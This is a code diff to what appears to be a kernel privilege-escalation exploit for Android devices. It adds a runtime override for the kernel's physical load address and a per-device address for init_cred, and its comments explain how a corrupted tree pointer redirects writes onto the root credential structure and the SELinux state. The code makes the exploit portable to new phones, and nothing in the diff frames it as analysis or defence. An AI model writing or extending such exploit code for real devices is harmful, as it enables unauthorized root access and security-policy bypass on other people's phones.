@@ -265,14 +265,35 @@ int has_zero_byte(uintptr_t value) {
   return 0;
 }
 
+/* Physical load address of the kernel image. Chosen by the bootloader, so it
+ * varies per SoC/board and is NOT derivable from the kernel image or DT.
+ * Verified on OnePlus 15 (SM8850/canoe) via /proc/iomem "Kernel code" =
+ * 0xc7810000 (= _stext; _text is 0x10000 lower) -> 0xc7800000, stable across
+ * boots. Override at runtime with KPHYS=0x... when porting to a new board. */
+uint64_t p0_kernel_phys_load = P0_KERNEL_PHYS_LOAD;
+
+/* Per-device image address of init_cred, set from the offsets table by main.c.
+ * Defaults to the compile-time value so non-table builds behave as before. */
+uintptr_t g_init_cred_image = INIT_CRED;
+
+void init_p0_profile(void) {
+  char *v = getenv("KPHYS");
+  if (v) {
+    p0_kernel_phys_load = strtoull(v, NULL, 0);
+  }
+  pr_info("p0 kernel_phys_load=%016llx delta=%016llx\n",
+          (unsigned long long)p0_kernel_phys_load,
+          (unsigned long long)(p0_kernel_phys_load - P0_PHYS_OFFSET));
+}
+
 uintptr_t p0_data_alias(uintptr_t image_addr) {
   uintptr_t off = image_addr - KIMAGE_TEXT_BASE;
-  uintptr_t phys = P0_KERNEL_PHYS_LOAD + off;
+  uintptr_t phys = p0_kernel_phys_load + off;
   return ((phys - P0_PHYS_OFFSET) | P0_PAGE_OFFSET);
 }
 
 uintptr_t p0_alias_image_offset(uintptr_t data_alias) {
-  return (data_alias - P0_PAGE_OFFSET) - P0_KERNEL_PHYS_DELTA;
+  return (data_alias - P0_PAGE_OFFSET) - (p0_kernel_phys_load - P0_PHYS_OFFSET);
 }
 
 uintptr_t data_addr(uintptr_t image_addr) {
@@ -493,8 +514,12 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
           /* Write 2 (cred): child = REAL init_cred (P0 address).
            * child->__rb_parent_color corrupts init_cred.usage (bytes 0-7)
            * but that's just a ref count — large value = won't be freed.
-           * uid/caps/security/user_ns all stay intact at offsets 8+. */
-          fake_right = data_addr(INIT_CRED);
+           * uid/caps/security/user_ns all stay intact at offsets 8+.
+           * NOTE: must use the runtime per-device offset, not target.h's
+           * compile-time INIT_CRED — main.c redefines INIT_CRED_OFF to the
+           * offsets-table entry but that redefinition is main.c-local, so
+           * this TU would otherwise bake in the wrong device's address. */
+          fake_right = data_addr(g_init_cred_image);
         } else {
           /* Write 1 (selinux): child = base+0x100 → byte0=0, byte1=1 */
           fake_right = base + 0x100;
